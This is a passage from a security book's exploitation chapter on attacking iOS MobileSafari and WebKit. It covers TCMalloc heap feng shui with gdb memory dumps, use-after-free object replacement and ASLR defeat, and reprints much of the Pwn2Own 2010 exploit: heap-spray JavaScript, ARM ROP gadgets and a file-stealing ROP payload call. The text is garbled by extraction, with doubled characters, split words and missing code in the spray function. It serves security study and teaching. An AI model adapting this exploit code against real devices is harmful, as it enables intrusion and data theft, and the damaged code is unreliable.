_8DocumentE+0x1b
WebCore`__ZN7WebCore14HTMLDivElement6createERKNS_13Qualifi edNameEPNS
_8DocumentE+0x1b
WebCore`__ZN7WebCore14HTMLDivElement6createERKNS_13Qualifi edNameEPNS
_8DocumentE+0x1b
cc0077..iinndddd 220099 44//1166//22001122 55::4466::1122 PPMM
210 Chapter 7 n Exploitation
WebCore`__ZN7WebCore14HTMLDivElement6createERKNS_13Qualifi edNameEPNS
_8DocumentE+0x1b
WebCore`__ZN7WebCore14HTMLDivElement6createERKNS_13Qualifi edNameEPNS
_8DocumentE+0x1b
WebCore`__ZN7WebCore14HTMLDivElement6createERKNS_13Qualifi edNameEPNS
_8DocumentE+0x1b
snaggs-MacBook-Air:~ snagg$cat out2 | grep HTMLDiv | wc -l
10
You have the 10 vulnerable objects in the Dtrace output. By attaching to the
process with gdb you can verify that the div objects are allocated between
strings. Arbitrarily picking one of the 10 vulnerable objects from the Dtrace
output, you have:
2 8717 __ZN3WTF10fastMallocEm:return Pointer 0x2e5ec00
JavaScriptCore`__ZN3WTF10fastMallocEm+0x1b2
WebCore`__ZN7WebCore14HTMLDivElement6createERKNS_13Qualifi edNameEPNS
_8DocumentE+0x1b
Now you can inspect the memory with gdb:
(gdb) x/40x 0x2e5ec00
0x2e5ec00: 0xad0d2228 0xad0d24cc 0x00000001 0x00000000
0x2e5ec10: 0x6d2e8654 0x02f9cb00 0x00000000 0x00000000
0x2e5ec20: 0x00000000 0x0058003c 0x00000000 0x00000000
0x2e5ec30: 0x00306ed0 0x00000000 0x00000000 0x00000000
0x2e5ec40: 0x02e5e480 0x00000014 0x02e5ec54 0x00000000
0x2e5ec50: 0x00000000 0x81818181 0x81818181 0x81818181
0x2e5ec60: 0x81818181 0x81818181 0x81818181 0x81818181
0x2e5ec70: 0x81818181 0x81818181 0x81818181 0x00000010
0x2e5ec80: 0x00000000 0x00000030 0x00000043 0x00000057
0x2e5ec90: 0x00000000 0x81818181 0x81818181 0x81818181
(gdb) x/40x 0x2e5ec00 - 0x40
0x2e5ebc0: 0x02e5ed00 0x00000014 0x02e5ebd4 0x00000000
0x2e5ebd0: 0x00000000 0x81818181 0x81818181 0x81818181
0x2e5ebe0: 0x81818181 0x81818181 0x81818181 0x81818181
0x2e5ebf0: 0x81818181 0x81818181 0x81818181 0x82828282
0x2e5ec00: 0xad0d2228 0xad0d24cc 0x00000001 0x00000000
0x2e5ec10: 0x6d2e8654 0x02f9cb00 0x00000000 0x00000000
0x2e5ec20: 0x00000000 0x0058003c 0x00000000 0x00000000
0x2e5ec30: 0x00306ed0 0x00000000 0x00000000 0x00000000
0x2e5ec40: 0x02e5e480 0x00000014 0x02e5ec54 0x00000000
0x2e5ec50: 0x00000000 0x81818181 0x81818181 0x81818181
(gdb)
cc0077..iinndddd 221100 44//1166//22001122 55::4466::1122 PPMM
Chapter 7 n Exploitation 211
It is clear that both before and after the div object you have two strings with
your own content (0x8181).
The importance of being able to overwrite application-specifi c data in TCMalloc
lies in the fact that, similar to what it is done for objects in the large region in
magazine malloc, the heap metadata is stored separately from each heap block.
Therefore, overwriting a TCMalloc’d buffer will not overwrite heap metadata,
but rather the buffer allocated after it. Thus, it is not possible to take advantage
of the typical old heap exploitation techniques used to obtain code execution.
Exploiting Object Lifetime Issues with TCMalloc
When it comes to object lifetime issues, it is not strictly necessary to have the
vulnerable object in between two objects over which you have control. It is more
important to ensure that you are able to replace the object with good reliability.
In this scenario, the fi rst step of the attack is to allocate one or more vulnerable
objects. Afterwards, the action that triggers the release of the object needs to be
performed. The next step is to allocate enough objects of the same size of the
vulnerable object to make sure that a garbage collection occurs, and at the same
time that the vulnerable object is replaced with an object of your choice. At this
point the only step left is to trigger a “use” condition to obtain code execution.
It is important to note that the same procedure used for arithmetic vulner-
abilities can be used for object lifetime issues as well. However, in that case you
must pay particular attention to the size of the objects you use and the number
of objects you allocate. In fact, the fi rst time you defragment the heap, a garbage
collection occurs; therefore, to trigger the garbage collector another time after
the object is freed, a higher number of objects is required.
The same problem occurs when you free the objects in between the ones
you control; to make sure that the vulnerable object is placed in a hole, another
garbage collection must be triggered. Given the structure of TCMalloc, it is clear
that the ideal way of triggering the garbage collector to exploit the vulnerability
is to use objects of a different size than the vulnerable one. In fact, by doing
so the freelist for the vulnerable object will not change much and you avoid
jeopardizing the success of your exploit.
ASLR Challenges
Up to version 4.3 it was possible to develop a Return Oriented Programming
(ROP) payload and an exploit for iOS without worrying too much about Address
Space Layout Randomization (ASLR). In fact, although there was still some
guesswork involved in understanding where attacker-controlled data would
cc0077..iinndddd 221111 44//1166//22001122 55::4466::1122 PPMM
212 Chapter 7 n Exploitation
be placed in the process address space, there were no problems in terms of
ROP payload development because all the libraries, the main binary, and the
dynamic linker were all placed at predictable addresses.
Starting with iOS 4.3, Apple introduced full address space layout randomiza-
tion on the iPhone.
ASLR on iOS randomizes all the libraries that are stored together in
dyld_shared_cache — the dynamic linker, the heap, the stack — and if the
application supports position independent code, the main executable is ran-
domized as well.
This poses numerous problems for attackers, mainly for two reasons. The
fi rst one is the inability to use ROP in their payload, and the second one is the
guesswork involved with fi nding the address where attacker-controlled data
might be placed.
There is no one-size-fi ts-all way to defeat ASLR. Quite the contrary — every
exploit has its own peculiarities that might provide a way to leak addresses
useful to an attacker.
A good example of ASLR defeat through repurposing an overfl ow is the
Saffron exploit by comex. In that exploit, a missing check on an argument counter
allowed an attacker to read and write from the following structure:
typedef struct T1_DecoderRec_
{
T1_BuilderRec builder;
FT_Long stack[T1_MAX_CHARSTRINGS_OPERANDS];
FT_Long* top;
T1_Decoder_ZoneRec zones[T1_MAX_SUBRS_CALLS + 1];
T1_Decoder_Zone zone;
FT_Service_PsCMaps psnames; /* for seac */
FT_UInt num_glyphs;
FT_Byte** glyph_names;
FT_Int lenIV; /* internal for sub routine calls */
FT_UInt num_subrs;
FT_Byte** subrs;
FT_PtrDist* subrs_len; /* array of subrs length (optional) */
FT_Matrix font_matrix;
FT_Vector font_offset;
FT_Int fl ex_state;
FT_Int num_fl ex_vectors;
cc0077..iinndddd 221122 44//1166//22001122 55::4466::1122 PPMM
Chapter 7 n Exploitation 213
FT_Vector fl ex_vectors[7];
PS_Blend blend; /* for multiple master support */
FT_Render_Mode hint_mode;
T1_Decoder_Callback parse_callback;
T1_Decoder_FuncsRec funcs;
FT_Long* buildchar;
FT_UInt len_buildchar;
FT_Bool seac;
} T1_DecoderRec;
The attacker then read a number of pointers, including parse_callback,
and stored a ROP payload constructed with the knowledge obtained by the
out-of-bound read in the buildchar member. Finally, the attacker overwrote
the parse_callback member and triggered a call to it. At that point, the ASLR-
defeating ROP payload was executed.
In general, the burden of defeating ASLR and the lack of generic methods to
use greatly increases the development effort that an attacker has to put into each
exploit. More importantly, while in the past it was possible to get away with guess-
work because libraries were not randomized, and therefore constructing a payload
was not a problem, from 4.3 on, an exploit must defeat ASLR to be successful.
The next section analyzes an exploit for MobileSafari that did not need to
bypass ASLR.
Case Study: Pwn2Own 2010
This case study presents the Pwn2Own exploit used in 2010. For the scope of
this chapter we have taken out the payload that was used because ROP concepts
are properly explained and commented in a different chapter of the book.
The function pwn() is responsible for bootstrapping the exploit. The fi rst thing
that is done in there is to generate a JavaScript function that creates an array
of strings. The strings are created using the fromCharCode() function, which
guarantees that you create a string of the correct size (see the example on heap
feng shui in the paragraph describing exploitation techniques against TCMalloc
for more details on the string implementation in WebKit). Each string is the
size of the object that needs to be replaced (20 UChars that are 40 bytes) and
the number of strings to allocate (4000 in this case). The rest of the parameters
cc0077..iinndddd 221133 44//1166//22001122 55::4466::1122 PPMM
214 Chapter 7 n Exploitation
specify the content of the string. It will be fi lled with some exploit-specifi c data
and the rest of it will be fi lled with an arbitrary value (0xCCCC).
The vulnerability itself is caused by attribute objects that were not properly
deleted from the Node cache when the attributes were deallocated. The rest of
the pwn() function takes care of allocating a number of attribute objects and to
remote them right after the allocation.
At this point the exploit triggers the garbage collector by calling the
nodeSpray() function, which is the function generated at the beginning by
genNodeSpray(). In addition to triggering the garbage collector, and thus mak-
ing sure that the attributes are released by the allocator, it also replaces them
with strings of the correct size.
The last step is to spray the heap with the shellcode that needs to be executed
and trigger a call to a virtual function (focus() in this case). This way the fi rst
four bytes of the string that is used to replace the object act as a virtual table
pointer and divert the execution to a location the attacker controls.
function genNodeSpray3GS (len, count, addy1, addy2, ret1, ret2, c,
objname) {
var evalstr = “function nodeSpray()
{ for(var i = 0; i  1 && i 1 && i 37 UChars
// Safari 4.0.5 (32 bit, both DEBUG & RELEASE) 40 bytes -> 20 UChars
// MobileSafari/iPhone 3.1.3 40 bytes -> 20 UChars
// 0x4a1c000 --> 0 open pages
// 0x4d00000 --> 1 open page
// 3g 0x5000000
//eval(genNodeSpray(20, 8000, 0x0000, 0x0500, 52428, “obj”));
eval(genNodeSpray3GS
(20, 4000, 0x0000, 0x0600, 0x328c, 0x23ef, 52428, “obj”));
// iOS 3.1.3 (2G/3G):
// gadget to gain control of SP, located at 0x33b4dc92 (libSystem)
//
cc0077..iinndddd 221155 44//1166//22001122 55::4466::1122 PPMM
216 Chapter 7 n Exploitation
// 33b4dc92 469d mov sp, r3
// 33b4dc94 bc1c pop {r2, r3, r4}
// 33b4dc96 4690 mov r8, r2
// 33b4dc98 469a mov sl, r3
// 33b4dc9a 46a3 mov fp, r4
// 33b4dc9c bdf0 pop {r4, r5, r6, r7, pc}
//
// note that we need to use jumpaddr+1 to enter thumb mode
// [for iOS 3.0 (2G/3G) use gadget at 0x31d8e6b4]
//
//
// iOS 3.1.3 3GS:
//
// gadget to gain control of SP, a bit more involved we can’t mov r3 in sp
so we do it in two stages:
//
// 3298d162 6a07 ldr r7, [r0, #32]
// 3298d164 f8d0d028 ldr.w sp, [r0, #40]
// 3298d168 6a40 ldr r0, [r0, #36]
// 3298d16a 4700 bx r0
//
// r0 is a pointer to the crafted node. We point r7 to our crafted stack,
and r0 to 0x328c23ee.
// the stack pointer points to something we don’t control as the node is
40 bytes long.
//
// 328c23ee f1a70d00 sub.w sp, r7, #0 ; 0x0
// 328c23f2 bd80 pop {r7, pc}
//
//3GS
var trampoline = “123456789012” + encode_uint32(0x3298d163);
//var ropshellcode = vibrate_rop_3_1_3_gs();
//we have to skip the fi rst 28 bytes
var ropshellcode = stealFile_rop_3_1_3_gs(0x600001c);
//3G
//var trampoline = “123456789012” + encode_uint32(0x33b4dc93);
//var ropshellcode = vibrate_rop_3_1_3_g();
for(var i = 0; i < attrs.length; i++) {
attrs[i] = document.createAttribute(’PWN’);
attrs[i].nodeValue = 0;
}